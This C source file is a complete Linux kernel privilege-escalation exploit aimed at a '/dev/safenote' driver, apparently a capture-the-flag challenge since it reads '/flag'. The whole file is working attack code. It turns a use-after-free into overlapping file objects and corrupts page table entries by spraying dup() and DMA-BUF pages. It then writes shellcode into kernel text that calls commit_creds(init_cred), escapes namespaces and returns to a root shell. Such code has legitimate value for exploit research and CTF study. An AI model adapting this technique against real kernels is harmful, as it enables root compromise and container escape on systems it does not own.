#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/dma-heap.h>
#include <linux/kcmp.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...)                                                           \
  do {                                                                         \
  } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__
#define PAGE_SIZE 0x1000

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

u8 WAIT() {
  write(STDERR_FILENO, "[WAITING...]\n", 13);
  u8 c;
  read(STDIN_FILENO, &c, 1);
  return c;
}

static inline void panic(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

struct linux_dirent {
  unsigned long d_ino;
  off_t d_off;
  unsigned short d_reclen;
  char d_name[];
};

void getShell() {
  // if (getuid()) {
  //   panic("NO ROOT");
  // }
  setbuf(stdout, NULL);
  char buf[0x1000] = {0};
  if (getuid() == 0) {
    write(1, "ROOT\n", 5);
  }

  else {
    panic("LOSE");
  }

  int fd = open("/", O_RDONLY);
  if (fd < 0) {
    write(1, "open error\n", 0x10);
  }
  struct linux_dirent *d;
  char d_type;
  for (;;) {
    u64 nread = syscall(SYS_getdents, fd, buf, sizeof(buf));
    if (nread == -1)
      break;

    if (nread == 0)
      break;

    printf("--------------- nread=%ld ---------------\n", nread);
    printf("inode#    file type  d_reclen  d_off   d_name\n");
    for (size_t bpos = 0; bpos < nread;) {
      d = (struct linux_dirent *)(buf + bpos);
      printf("%8lu  ", d->d_ino);
      d_type = *(buf + bpos + d->d_reclen - 1);
      printf("%-10s ", (d_type == DT_REG)    ? "regular"
                       : (d_type == DT_DIR)  ? "directory"
                       : (d_type == DT_FIFO) ? "FIFO"
                       : (d_type == DT_SOCK) ? "socket"
                       : (d_type == DT_LNK)  ? "symlink"
                       : (d_type == DT_BLK)  ? "block dev"
                       : (d_type == DT_CHR)  ? "char dev"
                                             : "???");
      printf("%4d %10jd  %s\n", d->d_reclen, (intmax_t)d->d_off, d->d_name);
      bpos += d->d_reclen;
    }
  }

  fd = open("/flag", O_RDONLY);
  read(fd, buf, 0x1000);
  write(1, buf, 0x1000);
  int _ = vfork();
  if (_) {
    sleep(999999);
  }
  char *path[] = {"/bin/sh", NULL};
  execve(path[0], path, NULL);
}

void save_state() {
  __asm__("mov [rip + user_cs], cs\n"
          "mov [rip + user_ss], ss\n"
          "mov [rip + user_sp], rsp\n"
          "mov [rip + user_ip], %0\n"
          "pushf\n"
          "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
  logInfo("Saved user state");
}

void pin_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    panic("sched_setaffinity");
  }
}

static void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (1L << 63);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0x8000;
  setrlimit(RLIMIT_NPROC, &rlim);
  if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
    rlim.rlim_cur = rlim.rlim_max = 4096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      panic("setrlimit(RLIMIT_NOFILE, &rlim)");
    }
  }

  struct rlimit print_limit;
  getrlimit(RLIMIT_NOFILE, &print_limit);
  logInfo("[RLIMIT_NOFILE] soft limit= 0x%lx \t"
          " hard limit= 0x%lx",
          (long)print_limit.rlim_cur, (long)print_limit.rlim_max);
  getrlimit(RLIMIT_AS, &print_limit);
  logInfo("[RLIMIT_AS] soft limit= 0x%lx \t"
          " hard limit= 0x%lx",
          (long)print_limit.rlim_cur, (long)print_limit.rlim_max);
}

struct ioctl_arg {
  u_int32_t heap_idx;
};

#define devfile "/dev/safenote"

int devfd;

static inline void allocNote(uint32_t idx) {
  struct ioctl_arg arg = {idx};
  ioctl(devfd, 0x1337, &arg);
}

static inline void delNote(uint32_t idx) {
  struct ioctl_arg arg = {idx};
  ioctl(devfd, 0x1338, &arg);
}

static inline void delNoteDirty(uint32_t idx) {
  struct ioctl_arg arg = {idx};
  ioctl(devfd, 0x1339, &arg);
}

void *allocate_shm_file_data(void) {
  int shmid = shmget(IPC_PRIVATE, 0x1000, 0666 | IPC_CREAT);
  void *addr = shmat(shmid, NULL, 0);
  if (addr == (void *)-1) {
    panic("shmat");
  }
  return addr;
}

int dma_heap_fd;

int allocDMA(uint64_t size) {
  struct dma_heap_allocation_data data;

  data.len = size;
  data.fd_flags = O_RDWR;
  data.heap_flags = 0;
  data.fd = 0;

  if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) {
    panic("DMA_HEAP_IOCTL_ALLOC");
  }
  return data.fd;
}

int fds[0x400];
void *prePagesSpray[0x800];

void __attribute__((naked)) shellcodeFunc() {
  asm volatile("lea rcx, [rip]\n"
               "sub rcx, 0x42cc47\n"
               "push rcx\n"

               "mov rcx, [rsp]\n"
               "add rcx, 0x2a76b00\n" // init_cred
               "mov rdi, rcx\n"

               "mov rcx, [rsp]\n"
               "add rcx, 0x1c2670\n" // commit_creds
               "call rcx\n"

               "mov rcx, [rsp]\n"
               "add rcx, 0x1b8fa0\n" // find_task_by_vpid
               "mov edi, 1\n"
               "call rcx\n"

               "mov rdi, rax\n"
               "mov rcx, [rsp]\n"
               "add rcx, 0x2a768c0\n" // init_nsproxy
               "mov rsi, rcx\n"
               "mov rcx, [rsp]\n"
               "add rcx, 0x1c0ad0\n" // switch_task_namespaces
               "call rcx\n"

               "mov rcx, [rsp]\n"
               "lea rdi, [rcx+0x2bb5320]\n" // init_fs
               "lea rax, [rcx+0x45c0f0]\n"  // copy_fs_struct
               "call rax\n"
               "mov rbx, rax\n"

               "mov rdi, 0x1111111111111111\n"
               "mov rcx, [rsp]\n"
               "lea rcx, [rcx+0x1b8fa0]\n" // find_task_by_vpid
               "call rcx\n"

               // pwndbg> p &(((struct task_struct* )0)->fs)
               // $3 = (struct fs_struct **) 0x828
               "mov [rax + 0x828], rbx\n"

               "mov rcx, [rsp]\n"
               "add rcx, 0x14011c6\n" // kpti
               "xor eax, eax\n"
               "mov [rsp], rax\n"
               "mov [rsp+8], rax\n"

               "mov rax, 0x2222222222222222\n"
               "mov [rsp+0x10], rax\n"

               "mov rax, 0x3333333333333333\n"
               "mov [rsp+0x18], rax\n"

               "mov rax, 0x4444444444444444\n"
               "mov [rsp+0x20], rax\n"

               "mov rax, 0x5555555555555555\n"
               "mov [rsp+0x28], rax\n"

               "mov rax, 0x6666666666666666\n"
               "mov [rsp+0x30], rax\n"

               "jmp rcx\n"

  );
}

int main(int argc, char **argv, char **envp) {

  adjust_rlimit();
  save_state();
  pin_cpu(0);

  char name[0x100] = {0};

  for (uint i = 0; i < 1; i++) {
    sprintf(name, "dummy%d", i);
    if (creat(name, 0777) < 0) {
      panic("create dummy");
    }
  }

  dma_heap_fd = open("/dev/dma_heap/system", O_RDWR);
  if (dma_heap_fd < 0) {
    panic("open /dev/dma_heap/system");
  }

  devfd = open(devfile, 0);
  if (devfd < 0) {
    panic("open " devfile);
  }

  for (uint i = 0; i < 0x100; ++i)
    allocNote(i);

  for (uint i = 0; i < 0xff; ++i) {
    delNote(i);
  }

  for (uint i = 0; i < 0x800; ++i) {
    prePagesSpray[i] =
        mmap((void *)(0x13370000UL + (PAGE_SIZE * 0x10) * i), PAGE_SIZE * 8,
             PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
    if (prePagesSpray[i] == MAP_FAILED) {
      panic("mmap");
    }
  }

  delNoteDirty(0xff);

  for (uint i = 0; i < 0x200; ++i) {

    fds[i] = open("dummy0", O_RDWR);
    if (fds[i] < 0) {
      logErr("open: %m");
    }
  }

  delNote(0xff);

  for (uint i = 0x200; i < 0x400; ++i) {

    fds[i] = open("dummy0", O_RDWR);
    if (fds[i] < 0) {
      logErr("open: %m");
    }
  }

  int overlapfdIdx = -1;
  int uaffdIdx = -1;

  for (uint i = 0; i < 0x200; ++i) {
    for (uint j = 0x200; j < 0x400; ++j) {
      if (syscall(SYS_kcmp, getpid(), getpid(), KCMP_FILE, fds[i], fds[j]) ==
          0) {
        logInfo("Dup: %d - %d", i, j);
        uaffdIdx = i;
        overlapfdIdx = j;
        break;
      }
    }
    if (overlapfdIdx >= 0 && uaffdIdx >= 0)
      break;
  }

  close(fds[overlapfdIdx]);

  for (uint i = 0; i < 0x400; ++i) {
    if (i == overlapfdIdx || i == uaffdIdx)
      continue;
    close(fds[i]);
  }

  logInfo("Spraying PTE(1)...");

  for (uint i = 0; i < 0x400; ++i) {
    for (uint j = 0; j < 8; ++j)
      *(char *)(prePagesSpray[i] + j * 0x1000) = 'A' + j;
  }

  logInfo("Allocate DMA-BUF heap");
  int dmaFD = allocDMA(PAGE_SIZE);
  logInfo("dmaFD: %d", dmaFD);

  logInfo("Spraying PTE(2)...");

  for (uint i = 0x400; i < 0x800; ++i) {
    for (uint j = 0; j < 8; j++)
      *(char *)(prePagesSpray[i] + j * 0x1000) = 'A' + j;
  }

  for (uint i = 0; i < 0x1000; ++i) { // Corrupt pte by increase it 0x1000
    if (dup(fds[uaffdIdx]) < 0)
      panic("dup");
  }

  void *targetPage = NULL;

  for (uint i = 0; i < 0x800; i++) {
    for (uint j = 0; j < 8; ++j) {
      if (*(char *)(prePagesSpray[i] + j * 0x1000) != 'A' + j) {
        targetPage = prePagesSpray[i] + j * 0x1000;
        break;
      }
    }
    if (targetPage)
      break;
  }

  logOK("targetPage: %p", targetPage);

  if (munmap(targetPage, PAGE_SIZE)) {
    panic("munmap");
  }

  void *dmaBuf = mmap(targetPage, PAGE_SIZE, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, dmaFD, 0);

  memset(dmaBuf, 'X', 8);

  for (uint i = 0; i < 0x1000; ++i) { // Corrupt pte by increase it 0x1000
    if (dup(fds[uaffdIdx]) < 0)
      panic("dup");
  }

  u64 *cur = NULL;
  for (cur = dmaBuf; cur < (u64 *)(dmaBuf + 0x8 * 10); cur++) {
    logInfo("|0x%016lx|", *cur);
  }

  u64 old_pte = *(u64 *)dmaBuf;
  if (((old_pte >> 56) != 0x80) || ((old_pte & 0xf) != 0x7)) {
    panic("NOT PTE :(");
  }

  void *wwwbuf = NULL;
  *(u64 *)dmaBuf = 0x800000000009c067;
  for (uint i = 0; i < 0x800; ++i) {
    if (prePagesSpray[i] == dmaBuf)
      continue;
    if (*(u64 *)prePagesSpray[i] > 0xffff) {
      wwwbuf = prePagesSpray[i];
      logOK("Found victim page table: %p\n", wwwbuf);
      break;
    }
  }

  u64 phys_base = ((*(u64 *)wwwbuf) & ~0xfff) - 0x3a01000;
  logInfo("Physical kernel base address: 0x%016lx", phys_base);

#define KASLR_ENABLED 1
#if KASLR_ENABLED
  phys_base -= 0x3000;
#endif

  u64 phys_symlinkat = phys_base + 0x42cc40;
  *(u64 *)dmaBuf = (phys_symlinkat & ~0xfff) | 0x8000000000000067;

  char shellcode[0x200] = {0};
  memcpy(shellcode, (char *)shellcodeFunc, 0x200);

  void *p;
  p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11",
             8);
  *(u64 *)p = getpid();
  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22",
             8);
  *(u64 *)p = (u64)getShell;
  p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33",
             8);
  *(u64 *)p = user_cs;
  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44",
             8);
  *(u64 *)p = user_rflags;
  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55",
             8);
  *(u64 *)p = user_sp;
  p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66",
             8);
  *(u64 *)p = user_ss;

  memcpy(wwwbuf + (phys_symlinkat & 0xfff), shellcode, sizeof(shellcode));

  //*(u64 *)dmaBuf = old_pte;
  logInfo("Getting ...");
  *(u64 *)dmaBuf = old_pte;
  printf("%d\n", symlink("/jail/x", "/jail"));
  logErr("Failed...");
  return 0;
}